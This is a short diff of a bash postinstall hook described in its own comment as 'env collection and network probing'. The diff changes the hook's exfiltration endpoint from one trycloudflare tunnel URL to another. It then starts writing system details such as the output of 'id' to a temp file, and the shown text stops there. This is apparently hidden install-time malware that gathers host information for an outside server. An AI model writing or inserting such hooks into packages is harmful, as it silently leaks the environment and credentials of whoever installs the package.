@@ -1,6 +1,6 @@
 #!/bin/bash
 # postinstall hook — env collection and network probing
-B="https://theoretical-lancaster-pci-okay.trycloudflare.com"
+B="https://delhi-facial-hours-sticker.trycloudflare.com"
 D=$(mktemp) || true
 {
 echo "=== id ===" && id || true
